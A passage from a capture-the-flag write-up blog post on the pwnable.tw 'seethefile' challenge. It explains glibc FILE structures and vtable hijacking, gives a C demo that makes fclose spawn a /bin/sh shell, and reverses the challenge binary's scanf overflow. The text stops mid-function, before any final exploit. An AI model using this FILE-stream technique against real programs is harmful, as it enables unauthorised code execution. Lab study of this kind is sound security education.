<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1" name="viewport"><meta content="pwnable.tw - seethefile" property="og:title"><meta content="article" property="og:type"><meta content="2020-03-29T01:23:36.608Z" property="og:published_time"><meta content="2020-03-30T08:23:31.139Z" property="og:modified_time"><meta content="Srikavin Ramkumar" property="og:author"><meta content="ctf-writeups" property="og:section"><meta content="pwnable.tw" property="og:tag"><meta content="binary-exploitation" property="og:tag"><meta content="file-stream-oriented-programming" property="og:tag"><meta content="pwntools" property="og:tag"><meta content="https://blog.srikavin.me/posts/pwnable-tw-seethefile/" property="og:url"><title>pwnable.tw - seethefile - srikavin.me</title><link href="/favicon.png" rel="icon"><link href="/bundle.css" rel="stylesheet"><script src="https://www.googletagmanager.com/gtag/js?id=G-X8ZVFPQ0CK" async></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-X8ZVFPQ0CK');</script></head><body><nav><div class="nav-left"><span><a href="https://srikavin.me" class="name">Srikavin Ramkumar</a> </span><span><a href="/posts" class="nav-link">Posts</a> </span><span><a href="/tags" class="nav-link">Tags</a></span></div><div class="nav-right"><a href="https://github.com/srikavin"><img alt="Github" src="/gh-logo.png" height="24px" width="24px"></a></div></nav><section class="section"><div class="container"><div class="page-container"><div class="blog-header"><h1 class="title">pwnable.tw - seethefile</h1><div class="subtitle"><span>Posted on <span class="date" title="Created: 2020-03-29T01:23:36.608Z&#10;Updated: 2020-03-30T08:23:31.139Z">March 29, 2020* </span>in ctf-writeups</span></div><div class="tags"><a href="https:&#x2F;&#x2F;blog.srikavin.me&#x2F;tags&#x2F;pwnable-tw&#x2F;"><span class="interactive minimal tag">pwnable.tw</span></a> <a href="https:&#x2F;&#x2F;blog.srikavin.me&#x2F;tags&#x2F;binary-exploitation&#x2F;"><span class="interactive minimal tag">binary-exploitation</span></a> <a href="https:&#x2F;&#x2F;blog.srikavin.me&#x2F;tags&#x2F;file-stream-oriented-programming&#x2F;"><span class="interactive minimal tag">file-stream-oriented-programming</span></a> <a href="https:&#x2F;&#x2F;blog.srikavin.me&#x2F;tags&#x2F;pwntools&#x2F;"><span class="interactive minimal tag">pwntools</span></a></div></div><div class="blog-content light"><div class="blog-scrollspy"><h1 class="scrollspy-label">Table of Contents</h1><ul><li><a href="#challenge" data-target="challenge">Challenge</a></li><li><a href="#background" data-target="background">Background</a><ul><li><a href="#io-file-plus" data-target="io-file-plus">_IO_FILE_plus</a></li><li><a href="#io-file" data-target="io-file">_IO_FILE</a></li><li><a href="#io-jump-t-vtable" data-target="io-jump-t-vtable">_IO_jump_t (vtable)</a></li><li><a href="#attacking-files-file-stream-oriented-programming" data-target="attacking-files-file-stream-oriented-programming">Attacking FILEs (File-Stream Oriented Programming)</a></li></ul></li><li><a href="#reversing" data-target="reversing">Reversing</a><ul><li><a href="#main" data-target="main">main</a></li><li><a href="#openfile" data-target="openfile">openfile</a></li><li><a href="#readfile" data-target="readfile">readfile</a></li><li><a href="#writefile" data-target="writefile">writefile</a></li><li><a href="#closefile" data-target="closefile">closefile</a></li></ul></li><li><a href="#attacking-the-program" data-target="attacking-the-program">Attacking the Program</a><ul><li><a href="#leaking-libc-base" data-target="leaking-libc-base">Leaking libc base</a></li><li><a href="#faking-a-file-struct" data-target="faking-a-file-struct">Faking a FILE struct</a><ul><li><a href="#choosing-the-flags" data-target="choosing-the-flags">Choosing the flags</a></li><li><a href="#bypassing-the-lock" data-target="bypassing-the-lock">Bypassing the lock</a></li></ul></li><li><a href="#overview" data-target="overview">Overview</a></li><li><a href="#final-script" data-target="final-script">Final Script</a></li></ul></li><li><a href="#further-reading" data-target="further-reading">Further Reading</a></li></ul></div><h1 id="challenge">Challenge</h1><blockquote><p>Can you see anything?</p><p>Get a shell for me.</p><p><code>nc chall.pwnable.tw 10200</code></p><p><a href="https://pwnable.tw/static/chall/seethefile">seethefile</a></p><p><a href="https://pwnable.tw/static/libc/libc_32.so.6">libc.so</a></p></blockquote><h1 id="background">Background</h1><h2 id="io-file-plus">_IO_FILE_plus</h2><p>Files are internally represented using the <a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libioP.h#L342"><code>_IO_FILE_plus</code></a> struct in glibc:</p><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">struct </span><span style="color:#323232;">_IO_FILE_plus
{
  _IO_FILE file;
  </span><span style="font-weight:bold;color:#a71d5d;">const struct </span><span style="color:#323232;">_IO_jump_t *vtable;
};
</span></code></pre><span id="continue-reading"></span><p>This struct is cast to an opaque <code>FILE</code> pointer and returned from <code>fopen</code>.</p><h2 id="io-file">_IO_FILE</h2><p>The <a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libio.h#L241"><code>_IO_FILE</code></a> struct contains buffered data and other details about a file:</p><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">struct </span><span style="color:#323232;">_IO_FILE {
  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> _flags;		</span><span style="font-style:italic;color:#969896;">/* High-order word is _IO_MAGIC; rest is flags. */
</span><span style="font-weight:bold;color:#a71d5d;">#define </span><span style="color:#323232;">_IO_file_flags _flags

  </span><span style="font-style:italic;color:#969896;">/* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_read_ptr;	</span><span style="font-style:italic;color:#969896;">/* Current read pointer */
  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_read_end;	</span><span style="font-style:italic;color:#969896;">/* End of get area. */
  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_read_base;	</span><span style="font-style:italic;color:#969896;">/* Start of putback+get area. */
  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_write_base;	</span><span style="font-style:italic;color:#969896;">/* Start of put area. */
  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_write_ptr;	</span><span style="font-style:italic;color:#969896;">/* Current put pointer. */
  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_write_end;	</span><span style="font-style:italic;color:#969896;">/* End of put area. */
  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_buf_base;	</span><span style="font-style:italic;color:#969896;">/* Start of reserve area. */
  </span><span style="font-weight:bold;color:#a71d5d;">char*</span><span style="color:#323232;"> _IO_buf_end;	</span><span style="font-style:italic;color:#969896;">/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  </span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">_IO_save_base; </span><span style="font-style:italic;color:#969896;">/* Pointer to start of non-current get area. */
  </span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">_IO_backup_base;  </span><span style="font-style:italic;color:#969896;">/* Pointer to first valid character of backup area */
  </span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">_IO_save_end; </span><span style="font-style:italic;color:#969896;">/* Pointer to end of non-current get area. */

  </span><span style="font-weight:bold;color:#a71d5d;">struct </span><span style="color:#323232;">_IO_marker *_markers;

  </span><span style="font-weight:bold;color:#a71d5d;">struct</span><span style="color:#323232;"> _IO_FILE *_chain;
  
  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> _fileno;
  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> _flags2;
  _IO_off_t _old_offset; </span><span style="font-style:italic;color:#969896;">/* This used to be _offset but it&#39;s too small.  */

</span><span style="font-weight:bold;color:#a71d5d;">#define </span><span style="color:#323232;">__HAVE_COLUMN </span><span style="font-style:italic;color:#969896;">/* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  </span><span style="font-weight:bold;color:#a71d5d;">unsigned short</span><span style="color:#323232;"> _cur_column;
  </span><span style="font-weight:bold;color:#a71d5d;">signed char</span><span style="color:#323232;"> _vtable_offset;
  </span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;"> _shortbuf[</span><span style="color:#0086b3;">1</span><span style="color:#323232;">];

  </span><span style="font-style:italic;color:#969896;">/*  char* _save_gptr;  char* _save_egptr; */

</span><span style="color:#323232;">  _IO_lock_t </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">_lock;
};
</span></code></pre><h2 id="io-jump-t-vtable">_IO_jump_t (vtable)</h2><p>Even more interestingly, the <code>_IO_FILE_plus</code> struct contains a field named <code>vtable</code>. This field acts as a jump table containing virtual functions that are used when interacting with the file.</p><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">struct </span><span style="color:#323232;">_IO_jump_t
{
    JUMP_FIELD(</span><span style="color:#0086b3;">size_t</span><span style="color:#323232;">, __dummy);
    JUMP_FIELD(</span><span style="color:#0086b3;">size_t</span><span style="color:#323232;">, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    </span><span style="font-style:italic;color:#969896;">/* showmany */
    </span><span style="color:#323232;">JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
</span></code></pre><p>For example, when <code>fclose(FILE *ptr)</code> is called, the function pointer stored in the <code>__finish</code> field in the struct will be called after freeing internal structures.</p><h2 id="attacking-files-file-stream-oriented-programming">Attacking FILEs (File-Stream Oriented Programming)</h2><p>If we are able to call file-related functions (fclose, fread, etc.) on a pointer we can redirect execution by creating entries in the <code>vtable</code> field in <code>_IO_FILE_plus</code>. I created an example program to demonstrate an attack by creating a fake <code>FILE</code> struct:</p><pre style="background-color:#ffffff;">
<code><span style="font-style:italic;color:#969896;">// gcc -m32 test.c -o test

</span><span style="font-weight:bold;color:#a71d5d;">#include </span><span style="color:#183691;">&lt;stdio.h&gt;
</span><span style="font-weight:bold;color:#a71d5d;">#include </span><span style="color:#183691;">&lt;stdlib.h&gt;

</span><span style="font-weight:bold;color:#a71d5d;">void*</span><span style="color:#323232;"> vtable[] </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">{
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(size_t, __dummy);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(size_t, __dummy2);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_finish_t, __finish);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_overflow_t, __overflow);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_underflow_t, __underflow);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_underflow_t, __uflow);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_sync_t, __sync);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_read_t, __read);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_write_t, __write);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_seek_t, __seek);
</span><span style="color:#323232;">    system,  </span><span style="font-style:italic;color:#969896;">// JUMP_FIELD(_IO_close_t, __close);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_stat_t, __stat);
    </span><span style="color:#0086b3;">NULL</span><span style="color:#323232;">, </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    </span><span style="color:#0086b3;">NULL  </span><span style="font-style:italic;color:#969896;">//    JUMP_FIELD(_IO_imbue_t, __imbue);
</span><span style="color:#323232;">};

</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="font-weight:bold;color:#795da3;">main</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="color:#323232;">argc, </span><span style="font-weight:bold;color:#a71d5d;">char** </span><span style="color:#323232;">argv) {
    </span><span style="font-style:italic;color:#969896;">// Creates a file and overwrites the vtable field in the FILE struct
</span><span style="color:#323232;">    FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">fp </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">fopen</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;/dev/null&quot;</span><span style="color:#323232;">, </span><span style="color:#183691;">&quot;r&quot;</span><span style="color:#323232;">);
    </span><span style="color:#0086b3;">size_t </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">vtable_addr </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">((</span><span style="font-weight:bold;color:#a71d5d;">void *</span><span style="color:#323232;">) fp) </span><span style="font-weight:bold;color:#a71d5d;">+ sizeof</span><span style="color:#323232;">(FILE);

    </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">vtable_addr </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">(</span><span style="color:#0086b3;">size_t </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)vtable;

    </span><span style="font-style:italic;color:#969896;">// Moves &quot;/bin/sh\x00&quot; to the start of the file pointer.
    // When system is called, it will interpret the FILE* as a char*, which
    // means that the interpreted string will be &quot;/bin/sh&quot; due to the null byte.
    </span><span style="color:#62a35c;">strcpy</span><span style="color:#323232;">(fp, </span><span style="color:#183691;">&quot;/bin/sh</span><span style="color:#0086b3;">\x00</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">);

    </span><span style="font-style:italic;color:#969896;">// Calls system with the FILE pointer as an argument. This should create
    // a shell.
    </span><span style="color:#62a35c;">fclose</span><span style="color:#323232;">(fp);

    </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
}
</span></code></pre><p>Running this test program gives us a shell and then segfaults: <img alt="" src="https://blog.srikavin.me/posts/pwnable-tw-seethefile/5e80319b0f5e61083b61b4a9.png"></p><h1 id="reversing">Reversing</h1><p>Reversing the program is made easy by cross-referencing the program's behavior with Ghidra.</p><h2 id="main">main</h2><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">int </span><span style="font-weight:bold;color:#795da3;">main</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="color:#323232;">argc,</span><span style="font-weight:bold;color:#a71d5d;">char **</span><span style="color:#323232;">argv){
  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> input;
  </span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;"> input_str [</span><span style="color:#0086b3;">32</span><span style="color:#323232;">];
  
  init();
  welcome();
  </span><span style="font-weight:bold;color:#a71d5d;">do </span><span style="color:#323232;">{
    menu();
    __isoc99_scanf(</span><span style="color:#183691;">&quot;</span><span style="color:#0086b3;">%s</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">,input_str);
    input </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">atoi</span><span style="color:#323232;">(input_str);
    </span><span style="font-weight:bold;color:#a71d5d;">switch</span><span style="color:#323232;">(input) {
    </span><span style="font-weight:bold;color:#a71d5d;">default</span><span style="color:#323232;">:
      </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Invaild choice&quot;</span><span style="color:#323232;">);
                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
      </span><span style="color:#62a35c;">exit</span><span style="color:#323232;">(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">);
    </span><span style="font-weight:bold;color:#a71d5d;">case </span><span style="color:#0086b3;">1</span><span style="color:#323232;">:
      openfile();
      </span><span style="font-weight:bold;color:#a71d5d;">break</span><span style="color:#323232;">;
    </span><span style="font-weight:bold;color:#a71d5d;">case </span><span style="color:#0086b3;">2</span><span style="color:#323232;">:
      readfile();
      </span><span style="font-weight:bold;color:#a71d5d;">break</span><span style="color:#323232;">;
    </span><span style="font-weight:bold;color:#a71d5d;">case </span><span style="color:#0086b3;">3</span><span style="color:#323232;">:
      writefile();
      </span><span style="font-weight:bold;color:#a71d5d;">break</span><span style="color:#323232;">;
    </span><span style="font-weight:bold;color:#a71d5d;">case </span><span style="color:#0086b3;">4</span><span style="color:#323232;">:
      closefile();
      </span><span style="font-weight:bold;color:#a71d5d;">break</span><span style="color:#323232;">;
    </span><span style="font-weight:bold;color:#a71d5d;">case </span><span style="color:#0086b3;">5</span><span style="color:#323232;">:
      </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Leave your name :&quot;</span><span style="color:#323232;">);
                    </span><span style="font-style:italic;color:#969896;">/* can overwrite fp */
      </span><span style="color:#323232;">__isoc99_scanf(</span><span style="color:#183691;">&quot;</span><span style="color:#0086b3;">%s</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">,name);
      </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Thank you </span><span style="color:#0086b3;">%s</span><span style="color:#183691;"> ,see you next time</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">,name);
      </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp </span><span style="font-weight:bold;color:#a71d5d;">!= </span><span style="color:#323232;">(FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
        </span><span style="color:#62a35c;">fclose</span><span style="color:#323232;">(fp);
      }
                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
      </span><span style="color:#62a35c;">exit</span><span style="color:#323232;">(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">);
    }
  } </span><span style="font-weight:bold;color:#a71d5d;">while</span><span style="color:#323232;">( </span><span style="color:#0086b3;">true </span><span style="color:#323232;">);
}
</span></code></pre><p>The use of <code>scanf</code> without a maximum width specified allows for a buffer overflow attack in the .bss section. Overflowing the <code>name</code> buffer allows us to overwrite <code>FILE *fp</code>.</p><h2 id="openfile">openfile</h2><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">int </span><span style="font-weight:bold;color:#795da3;">openfile</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">){
  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> iVar1;
  </span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">pcVar2;
  
  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
    </span><span style="color:#62a35c;">memset</span><span style="color:#323232;">(filebuf,</span><span style="color:#0086b3;">0</span><span style="color:#323232;">,</span><span style="color:#0086b3;">400</span><span style="color:#323232;">);
    </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;What do you want to see :&quot;</span><span style="color:#323232;">);
    __isoc99_scanf(</span><span style="color:#183691;">&quot;</span><span style="color:#0086b3;">%63s</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">,filename);
    pcVar2 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">strstr</span><span style="color:#323232;">(filename,</span><span style="color:#183691;">&quot;flag&quot;</span><span style="color:#323232;">);
    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(pcVar2 </span><span style="font-weight:bold;color:#a71d5d;">!= </span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
      </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Danger !&quot;</span><span style="color:#323232;">);
                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
      </span><span style="color:#62a35c;">exit</span><span style="color:#323232;">(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">);
    }
    fp </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">fopen</span><span style="color:#323232;">(filename,</span><span style="color:#183691;">&quot;r&quot;</span><span style="color:#323232;">);
    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
      iVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Open failed&quot;</span><span style="color:#323232;">);
    }
    </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
      iVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Open Successful&quot;</span><span style="color:#323232;">);
    }
  }
  </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;You need to close the file first&quot;</span><span style="color:#323232;">);
    iVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
  }
  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;"> iVar1;
}
</span></code></pre><p>This opens any file without <code>flag</code> in its name and stores its file descriptor (<code>FILE *</code>) in <code>fp</code>.</p><h2 id="readfile">readfile</h2><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">readfile</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">){
  </span><span style="color:#0086b3;">size_t </span><span style="color:#323232;">sVar1;
  
  </span><span style="color:#62a35c;">memset</span><span style="color:#323232;">(filebuf,</span><span style="color:#0086b3;">0</span><span style="color:#323232;">,</span><span style="color:#0086b3;">400</span><span style="color:#323232;">);
  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;You need to open a file first&quot;</span><span style="color:#323232;">);
  }
  </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
    sVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">fread</span><span style="color:#323232;">(filebuf,</span><span style="color:#0086b3;">399</span><span style="color:#323232;">,</span><span style="color:#0086b3;">1</span><span style="color:#323232;">,fp);
    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(sVar1 </span><span style="font-weight:bold;color:#a71d5d;">!= </span><span style="color:#0086b3;">0</span><span style="color:#323232;">) {
      </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Read Successful&quot;</span><span style="color:#323232;">);
    }
  }
  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
}
</span></code></pre><p>This reads the next 399 characters of the previously opened file into a buffer in memory.</p><h2 id="writefile">writefile</h2><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">writefile</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">) {
  </span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">pcVar1;
  
  pcVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">strstr</span><span style="color:#323232;">(filename,</span><span style="color:#183691;">&quot;flag&quot;</span><span style="color:#323232;">);
  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(pcVar1 </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
    pcVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">strstr</span><span style="color:#323232;">(filebuf,</span><span style="color:#183691;">&quot;FLAG&quot;</span><span style="color:#323232;">);
    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(pcVar1 </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
                    </span><span style="font-style:italic;color:#969896;">/* ASCII &#39;}&#39; */
</span><span style="color:#323232;">      pcVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">strchr</span><span style="color:#323232;">(filebuf,</span><span style="color:#0086b3;">0x7d</span><span style="color:#323232;">);
      </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(pcVar1 </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
        </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(filebuf);
        </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
      }
    }
  }
  </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;you can</span><span style="color:#0086b3;">\&#39;</span><span style="color:#183691;">t see it&quot;</span><span style="color:#323232;">);
                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
  </span><span style="color:#62a35c;">exit</span><span style="color:#323232;">(</span><span style="color:#0086b3;">1</span><span style="color:#323232;">);
}
</span></code></pre><p>This prints the contents of the previously loaded memory buffer as long as it doesn't contain &quot;FLAG&quot; or the character '}'.</p><h2 id="closefile">closefile</h2><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">closefile</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">)

{
